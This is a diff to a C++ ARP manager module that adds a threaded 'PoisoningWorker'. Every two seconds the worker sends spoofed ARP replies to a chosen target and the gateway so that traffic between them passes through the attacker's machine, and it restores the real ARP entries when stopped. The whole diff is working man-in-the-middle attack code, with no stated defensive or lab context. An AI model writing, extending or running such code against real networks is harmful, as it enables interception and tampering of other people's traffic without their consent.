@@ -6,6 +6,8 @@
 #include <algorithm>
 #include <codecvt>
 #include <locale>
+#include <thread>
+#include <mutex>
 
 // Helper function to convert wide string to string
 static std::string WideStringToString(const std::wstring& wstr) {
@@ -30,6 +32,7 @@ std::unique_ptr<ArpManager> g_arp_manager;
 ArpManager::ArpManager() : pcap_handle(nullptr), is_initialized(false), poisoning_active(false) {
     initializeBuffers();
     resetPerformanceStats();
+    poisoning_worker_ = std::make_unique<PoisoningWorker>(this);
 }
 
 ArpManager::~ArpManager() {
@@ -145,6 +148,11 @@ bool ArpManager::initialize(const std::string& adapter_name) {
 }
 
 void ArpManager::cleanup() {
+    // Stop poisoning worker first
+    if (poisoning_worker_) {
+        poisoning_worker_->stopAll();
+    }
+    
     if (pcap_handle) {
         pcap_close(pcap_handle);
         pcap_handle = nullptr;
@@ -735,7 +743,7 @@ std::vector<std::string> ArpManager::enumeratePcapDevices() {
     return devices;
 }
 
-// Phase 2: ARP poisoning implementation
+// Phase 2: ARP poisoning implementation - Updated for Step 4 continuous poisoning
 bool ArpManager::startArpPoisoning(const std::string& target_ip, const std::string& target_mac) {
     if (!is_initialized || !pcap_handle) {
         setError("ARP Manager not properly initialized for poisoning operations");
@@ -748,64 +756,37 @@ bool ArpManager::startArpPoisoning(const std::string& target_ip, const std::stri
         refreshGatewayMac();
     }
     
-    // Check if target is already being poisoned
-    for (const auto& target : poisoning_targets) {
-        if (target.ip == target_ip && target.is_active) {
-            printf("ARP Manager: Target %s is already being poisoned\n", target_ip.c_str());
-            return true;
+    printf("ARP Manager: Starting continuous ARP poisoning for target %s (%s)\n", target_ip.c_str(), target_mac.c_str());
+    
+    // Use the new PoisoningWorker for continuous poisoning
+    if (poisoning_worker_) {
+        bool success = poisoning_worker_->start(target_ip, target_mac);
+        if (success) {
+            poisoning_active = true;
         }
+        return success;
     }
     
-    // Add target to poisoning list
-    PoisoningTarget new_target;
-    new_target.ip = target_ip;
-    new_target.mac = target_mac;
-    new_target.is_active = true;
-    poisoning_targets.push_back(new_target);
-    
-    poisoning_active = true;
-    
-    printf("ARP Manager: Started ARP poisoning for target %s (%s)\n", target_ip.c_str(), target_mac.c_str());
-    
-    // Immediately send initial poisoning packets
-    return poisonArpCache(target_ip, target_mac, network_info.gateway_ip, network_info.interface_mac) &&
-           poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, network_info.interface_mac);
+    setError("PoisoningWorker not available");
+    return false;
 }
 
 bool ArpManager::stopArpPoisoning(const std::string& target_ip) {
-    bool found = false;
+    printf("ARP Manager: Stopping ARP poisoning for target %s\n", target_ip.c_str());
     
-    for (auto& target : poisoning_targets) {
-        if (target.ip == target_ip && target.is_active) {
-            target.is_active = false;
-            found = true;
-            
-            // Restore legitimate ARP entries
-            printf("ARP Manager: Restoring legitimate ARP entries for %s\n", target_ip.c_str());
-            
-            // Send legitimate ARP replies to restore normal connectivity
-            poisonArpCache(target_ip, target.mac, network_info.gateway_ip, network_info.gateway_mac);
-            poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, target.mac);
-            
-            break;
+    if (poisoning_worker_) {
+        bool success = poisoning_worker_->stop(target_ip);
+        
+        // Update poisoning_active status
+        if (success && !poisoning_worker_->isRunning()) {
+            poisoning_active = false;
+            printf("ARP Manager: All ARP poisoning stopped\n");
         }
+        
+        return success;
     }
     
-    // Check if any targets are still active
-    bool any_active = false;
-    for (const auto& target : poisoning_targets) {
-        if (target.is_active) {
-            any_active = true;
-            break;
-        }
-    }
-    
-    if (!any_active) {
-        poisoning_active = false;
-        printf("ARP Manager: All ARP poisoning stopped\n");
-    }
-    
-    return found;
+    return false;
 }
 
 bool ArpManager::poisonArpCache(const std::string& victim_ip, const std::string& victim_mac, 
@@ -866,6 +847,185 @@ bool ArpManager::poisonArpCache(const std::string& victim_ip, const std::string&
     }
     
     return success;
+}
+
+// Step 4: PoisoningWorker Implementation
+bool ArpManager::PoisoningWorker::start(const std::string& target_ip, const std::string& target_mac) {
+    std::lock_guard<std::mutex> lock(targets_mutex_);
+    
+    // Check if target is already being poisoned
+    for (const auto& target : targets_) {
+        if (target.ip == target_ip) {
+            printf("PoisoningWorker: Target %s is already being poisoned\n", target_ip.c_str());
+            return true;
+        }
+    }
+    
+    // Add target to the list
+    Target new_target;
+    new_target.ip = target_ip;
+    new_target.mac = target_mac;
+    targets_.push_back(new_target);
+    
+    printf("PoisoningWorker: Added target %s (%s) to poisoning list\n", target_ip.c_str(), target_mac.c_str());
+    
+    // Start the poisoning thread if not already running
+    if (!running_.load()) {
+        running_.store(true);
+        thread_ = std::thread(&PoisoningWorker::loop, this);
+        printf("PoisoningWorker: Started continuous poisoning thread\n");
+    }
+    
+    return true;
+}
+
+bool ArpManager::PoisoningWorker::stop(const std::string& target_ip) {
+    std::lock_guard<std::mutex> lock(targets_mutex_);
+    
+    // Find and remove the target
+    auto it = std::find_if(targets_.begin(), targets_.end(), 
+        [&target_ip](const Target& target) {
+            return target.ip == target_ip;
+        });
+    
+    if (it != targets_.end()) {
+        Target target_to_restore = *it;
+        targets_.erase(it);
+        
+        printf("PoisoningWorker: Removed target %s from poisoning list\n", target_ip.c_str());
+        
+        // Send 3 legitimate ARP replies to restore normal connectivity
+        printf("PoisoningWorker: Restoring legitimate ARP entries for %s\n", target_ip.c_str());
+        
+        if (arp_manager_ && arp_manager_->is_initialized) {
+            const auto& network_info = arp_manager_->network_info;
+            
+            // Restore victim -> gateway association
+            for (int i = 0; i < 3; i++) {
+                arp_manager_->sendArpReply(network_info.gateway_ip, target_to_restore.ip, 
+                                         network_info.gateway_mac, target_to_restore.mac);
+                
+                // Restore gateway -> victim association  
+                arp_manager_->sendArpReply(target_to_restore.ip, network_info.gateway_ip,
+                                         target_to_restore.mac, network_info.gateway_mac);
+                
+                if (i < 2) Sleep(100); // Small delay between restoration packets
+            }
+        }
+        
+        // If no more targets, stop the thread
+        if (targets_.empty()) {
+            running_.store(false);
+            if (thread_.joinable()) {
+                thread_.join();
+            }
+            printf("PoisoningWorker: Stopped continuous poisoning thread\n");
+        }
+        
+        return true;
+    }
+    
+    return false; // Target not found
+}
+
+void ArpManager::PoisoningWorker::stopAll() {
+    std::lock_guard<std::mutex> lock(targets_mutex_);
+    
+    if (!running_.load()) {
+        return; // Already stopped
+    }
+    
+    printf("PoisoningWorker: Stopping all poisoning operations...\n");
+    
+    // Send restoration packets for all targets
+    if (arp_manager_ && arp_manager_->is_initialized) {
+        const auto& network_info = arp_manager_->network_info;
+        
+        for (const auto& target : targets_) {
+            printf("PoisoningWorker: Restoring legitimate ARP entries for %s\n", target.ip.c_str());
+            
+            // Send 3 legitimate ARP replies to restore normal connectivity
+            for (int i = 0; i < 3; i++) {
+                // Restore victim -> gateway association
+                arp_manager_->sendArpReply(network_info.gateway_ip, target.ip, 
+                                         network_info.gateway_mac, target.mac);
+                
+                // Restore gateway -> victim association
+                arp_manager_->sendArpReply(target.ip, network_info.gateway_ip,
+                                         target.mac, network_info.gateway_mac);
+                
+                if (i < 2) Sleep(100); // Small delay between restoration packets
+            }
+        }
+    }
+    
+    // Clear targets and stop thread
+    targets_.clear();
+    running_.store(false);
+    
+    if (thread_.joinable()) {
+        thread_.join();
+    }
+    
+    printf("PoisoningWorker: All poisoning operations stopped and ARP tables restored\n");
+}
+
+std::vector<ArpManager::PoisoningWorker::Target> ArpManager::PoisoningWorker::getTargets() const {
+    std::lock_guard<std::mutex> lock(targets_mutex_);
+    return targets_;
+}
+
+void ArpManager::PoisoningWorker::loop() {
+    printf("PoisoningWorker: Continuous poisoning loop started\n");
+    
+    while (running_.load()) {
+        {
+            std::lock_guard<std::mutex> lock(targets_mutex_);
+            
+            // Send poisoning packets for each target
+            for (const auto& target : targets_) {
+                sendSpoof(target);
+            }
+        }
+        
+        // Wait 2000ms as specified in Step 4
+        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+    }
+    
+    printf("PoisoningWorker: Continuous poisoning loop ended\n");
+}
+
+void ArpManager::PoisoningWorker::sendSpoof(const Target& target) {
+    if (!arp_manager_ || !arp_manager_->is_initialized) {
+        return;
+    }
+    
+    const auto& network_info = arp_manager_->network_info;
+    
+    // Ensure we have valid network information
+    if (network_info.gateway_ip.empty() || network_info.gateway_mac.empty() || 
+        network_info.interface_mac.empty()) {
+        printf("PoisoningWorker: WARNING - Incomplete network information, skipping spoof for %s\n", 
+               target.ip.c_str());
+        return;
+    }
+    
+    // Send two spoofed ARP replies as specified in Step 4:
+    // 1. Tell victim that gateway IP is at our MAC
+    bool success1 = arp_manager_->sendArpReply(network_info.gateway_ip, target.ip, 
+                                              network_info.interface_mac, target.mac);
+    
+    // 2. Tell gateway that victim IP is at our MAC  
+    bool success2 = arp_manager_->sendArpReply(target.ip, network_info.gateway_ip,
+                                              network_info.interface_mac, network_info.gateway_mac);
+    
+    if (success1 && success2) {
+        printf("PoisoningWorker: Successfully poisoned %s <-> %s via %s\n", 
+               target.ip.c_str(), network_info.gateway_ip.c_str(), network_info.interface_mac.c_str());
+    } else {
+        printf("PoisoningWorker: WARNING - Failed to send poisoning packets for %s (success1=%d, success2=%d)\n", 
+               target.ip.c_str(), success1, success2);
+    }
 }
 
 // C++ function implementations for N-API exports
